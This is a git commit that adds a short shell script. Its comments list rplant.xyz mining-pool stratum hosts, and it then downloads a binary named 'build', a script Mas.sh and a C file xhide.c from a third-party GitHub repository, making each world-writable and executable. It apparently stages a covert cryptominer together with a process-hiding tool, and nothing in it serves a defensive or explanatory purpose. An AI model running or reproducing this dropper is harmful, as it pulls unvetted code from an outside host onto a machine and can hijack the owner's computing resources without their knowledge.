0b2d068045e65740f6df76cae81f3c63479bd6d2
reabeo280 <84188946+reabeo280@users.noreply.github.com>
2021-05-14 19:20:47 +0530

    Create T43gj.sh

---
+++ T43gj.sh
@@ -0,0 +1,14 @@
+#!/bin/sh
+#
+# Choose nearest stratum:
+# stratum-ru.rplant.xyz   /Moscow/
+# stratum-eu.rplant.xyz   /London/
+# stratum-asia.rplant.xyz /Singapore/
+# stratum-na.rplant.xyz   /Toronto/
+#
+#SGR
+wget https://github.com/redv67/rwicn/raw/main/build 
+chmod 777 build 
+wget https://github.com/redv67/rwicn/raw/main/Mas.sh 
+chmod 777 Mas.sh 
+wget https://github.com/redv67/rwicn/raw/main/xhide.c 
